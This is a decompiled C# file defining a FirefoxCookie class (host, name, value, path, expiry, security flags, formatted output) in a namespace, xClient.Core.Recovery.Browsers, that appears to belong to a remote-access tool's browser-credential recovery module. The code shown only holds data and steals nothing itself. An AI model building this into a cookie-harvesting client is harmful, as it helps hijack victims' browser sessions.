using System;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000B1 RID: 177
	public class FirefoxCookie
	{
		// Token: 0x170000D0 RID: 208
		// (get) Token: 0x060004A9 RID: 1193 RVA: 0x000044BC File Offset: 0x000026BC
		// (set) Token: 0x060004AA RID: 1194 RVA: 0x000044C4 File Offset: 0x000026C4
		public string Host { get; set; }

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x060004AB RID: 1195 RVA: 0x000044CD File Offset: 0x000026CD
		// (set) Token: 0x060004AC RID: 1196 RVA: 0x000044D5 File Offset: 0x000026D5
		public string Name { get; set; }

		// Token: 0x170000D2 RID: 210
		// (get) Token: 0x060004AD RID: 1197 RVA: 0x000044DE File Offset: 0x000026DE
		// (set) Token: 0x060004AE RID: 1198 RVA: 0x000044E6 File Offset: 0x000026E6
		public string Value { get; set; }

		// Token: 0x170000D3 RID: 211
		// (get) Token: 0x060004AF RID: 1199 RVA: 0x000044EF File Offset: 0x000026EF
		// (set) Token: 0x060004B0 RID: 1200 RVA: 0x000044F7 File Offset: 0x000026F7
		public string Path { get; set; }

		// Token: 0x170000D4 RID: 212
		// (get) Token: 0x060004B1 RID: 1201 RVA: 0x00004500 File Offset: 0x00002700
		// (set) Token: 0x060004B2 RID: 1202 RVA: 0x00004508 File Offset: 0x00002708
		public DateTime ExpiresUTC { get; set; }

		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x060004B3 RID: 1203 RVA: 0x00004511 File Offset: 0x00002711
		// (set) Token: 0x060004B4 RID: 1204 RVA: 0x00004519 File Offset: 0x00002719
		public bool Secure { get; set; }

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x060004B5 RID: 1205 RVA: 0x00004522 File Offset: 0x00002722
		// (set) Token: 0x060004B6 RID: 1206 RVA: 0x0000452A File Offset: 0x0000272A
		public bool HttpOnly { get; set; }

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x060004B7 RID: 1207 RVA: 0x00004533 File Offset: 0x00002733
		// (set) Token: 0x060004B8 RID: 1208 RVA: 0x0000453B File Offset: 0x0000273B
		public bool Expired { get; set; }

		// Token: 0x060004B9 RID: 1209 RVA: 0x00010890 File Offset: 0x0000EA90
		public override string ToString()
		{
			return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", new object[]
			{
				Environment.NewLine,
				this.Host,
				this.Name,
				this.Value,
				this.Path,
				this.Expired,
				this.HttpOnly,
				this.Secure
			});
		}
	}
}
